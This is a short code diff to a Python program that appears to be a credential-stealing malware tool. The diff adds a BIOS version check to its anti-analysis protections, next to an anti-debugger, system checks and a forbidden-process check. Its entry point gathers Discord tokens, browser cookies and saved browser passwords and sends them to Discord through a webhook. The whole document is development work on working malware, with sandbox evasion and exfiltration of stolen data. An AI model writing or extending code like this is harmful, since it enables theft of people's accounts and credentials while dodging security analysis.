@@ -12,6 +12,7 @@ from Utilities.MemoryManager import MemoryHandler
 from Protections.Debugger import AntiDebugger
 from Protections.System import SystemChecks
 from Protections.Noise import NoiseGenerator
+from Protections.Biosversion import BIOSVersionChecker
 from Protections.Forbiddenprocess import ForbiddenProcessCheck
 from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
 
@@ -36,7 +37,10 @@ class Checks:
             for method_name in methods_to_try:
                 if hasattr(check_module, method_name):
                     method = getattr(check_module, method_name)
-                    result = await method() if asyncio.iscoroutinefunction(method) else method()
+                    if asyncio.iscoroutinefunction(method):
+                        result = await method()
+                    else:
+                        result = await asyncio.to_thread(method)
                     if result:
                         raise CheckFailedException(f"{check_module.__class__.__name__} checks failed!")
                     method_found = True
@@ -111,7 +115,7 @@ async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
         encryptor.send_data_to_discord(saved_data)
 
 if __name__ == "__main__":
-    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck())
+    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker())
     recovery = Recovery(DiscordTokenRecovery(), CookieRecovery(), BrowserPasswordRecovery())
     noise_methods = [
         NoiseGenerator.create_noise, 
